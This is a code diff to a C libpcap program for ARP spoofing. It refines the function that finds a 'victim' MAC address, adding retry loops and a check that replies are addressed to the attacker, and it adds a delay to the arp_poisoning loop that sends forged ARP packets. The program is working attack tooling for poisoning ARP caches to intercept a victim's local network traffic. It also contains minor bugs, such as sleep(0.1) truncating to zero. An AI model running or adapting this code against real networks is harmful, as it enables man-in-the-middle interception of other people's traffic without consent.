@@ -9,6 +9,7 @@
 #include <arpa/inet.h>
 #include <stdint.h>
 #include <netinet/if_ether.h>
+#include <time.h>
 
 #define MAC_SIZE 20
 #define IP_SIZE  20
@@ -121,58 +122,78 @@ void find_victim_mac(pcap_t * handle) {
 	memcpy(packet, &eth_header, 14); // ethernet header
 	memcpy(packet+14, &arp_header, 28); // arp header
 
-	// send arp packet
-	if (pcap_sendpacket(handle, packet, 42) != 0) { 
-		printf("[*] error sending packet....\n");
-		exit(0);
-	}
-	// get packet
-	while (1) {
 
-		struct pcap_pkthdr* header;
-		const u_char* recv_packet;
-		int res = pcap_next_ex(handle, &header, &recv_packet);
-		if (res == 0) continue;
-		if (res == -1 || res == -2) break;
+	// send packet
+	while(1) {
 
-		struct ether_header *eh = (struct ether_header *)recv_packet;
-		uint16_t ether_type = ntohs(eh->ether_type);
+		// send arp packet
+		if (pcap_sendpacket(handle, packet, 42) != 0) { 
+			printf("[*] error sending packet....\n");
+			exit(0);
+		}
+		// get packet
+		int cnt = 5;
+		while (cnt--) {
+			
+			printf("enumerating victim mac...\n");
+			struct pcap_pkthdr* header;
+			const u_char* recv_packet;
+			int res = pcap_next_ex(handle, &header, &recv_packet);
+			if (res == 0) continue;
+			if (res == -1 || res == -2) break;
 
-		struct ether_arp *arp_header = (struct ether_arp *)(recv_packet + 14);
-		uint16_t opcode = ntohs(arp_header->ea_hdr.ar_op);
-		// printf("opcode : %u\n", opcode);
-		
-		// check if opcode is 0x02 (arp reply)
-		if (ether_type == ETHERTYPE_ARP && opcode == 0x02) {
+			struct ether_header *eh = (struct ether_header *)recv_packet;
+			uint16_t ether_type = ntohs(eh->ether_type);
 
-			char dest_mac[MAC_SIZE];	// my mac
-			sprintf(dest_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
-				eh->ether_dhost[0],
-				eh->ether_dhost[1],
-				eh->ether_dhost[2],
-				eh->ether_dhost[3],
-				eh->ether_dhost[4],
-				eh->ether_dhost[5]);
+			struct ether_arp *arp_header = (struct ether_arp *)(recv_packet + 14);
+			uint16_t opcode = ntohs(arp_header->ea_hdr.ar_op);
+			// printf("opcode : %u\n", opcode);
 
-			char source_mac[MAC_SIZE]; // victim mac
-			sprintf(source_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
-				eh->ether_shost[0],
-				eh->ether_shost[1],
-				eh->ether_shost[2],
-				eh->ether_shost[3],
-				eh->ether_shost[4],
-				eh->ether_shost[5]);
+			// check if opcode is 0x02 (arp reply)
+			if (ether_type == ETHERTYPE_ARP && opcode == 0x02) {
 
-			//printf("source mac : %s\n", source_mac);
-			//printf("dest mac : %s\n", dest_mac);
+				struct ether_addr dest_mac_bin;
+				memcpy(&dest_mac_bin, eh->ether_dhost, sizeof(struct ether_addr));
 
-			strcpy(victim_mac, ether_ntoa((const struct ether_addr *)eh->ether_shost));
-			printf("[*] victim mac : %s\n", source_mac);
-			ether_aton_r(source_mac, &victim_mac_bin);
-			// memcpy(&victim_mac_bin, eh->ether_shost, 6);
-			//printf("debug : %x %x %x %x\n", victim_mac_bi;
-			break;
-		} // end if
+				// printf("%x\n", my_mac_bin);
+				// printf("%x\n", dest_mac_bin);
+
+				if( !memcmp(&my_mac_bin, &dest_mac_bin, sizeof(struct ether_addr) )) {
+
+					char dest_mac[MAC_SIZE];	// my mac
+					sprintf(dest_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
+							eh->ether_dhost[0],
+							eh->ether_dhost[1],
+							eh->ether_dhost[2],
+							eh->ether_dhost[3],
+							eh->ether_dhost[4],
+							eh->ether_dhost[5]);
+
+					char source_mac[MAC_SIZE]; // victim mac
+					sprintf(source_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
+							eh->ether_shost[0],
+							eh->ether_shost[1],
+							eh->ether_shost[2],
+							eh->ether_shost[3],
+							eh->ether_shost[4],
+							eh->ether_shost[5]);
+
+					//printf("source mac : %s\n", source_mac);
+					//printf("dest mac : %s\n", dest_mac);
+
+					strcpy(victim_mac, ether_ntoa((const struct ether_addr *)eh->ether_shost));
+					printf("[*] victim mac : %s\n", source_mac);
+					ether_aton_r(source_mac, &victim_mac_bin);
+					// memcpy(&victim_mac_bin, eh->ether_shost, 6);
+					//printf("debug : %x %x %x %x\n", victim_mac_bi;
+					return;
+				} // if memcpy
+
+				sleep(0.1);
+
+			} // end if
+		} // end while
+
 	} // end while
 
 }
@@ -217,6 +238,7 @@ void arp_poisoning(pcap_t * handle) {
 			printf("[*] error sending packet....\n");
 			exit(0);
 		}
+		sleep(5);
 	}
 
 }
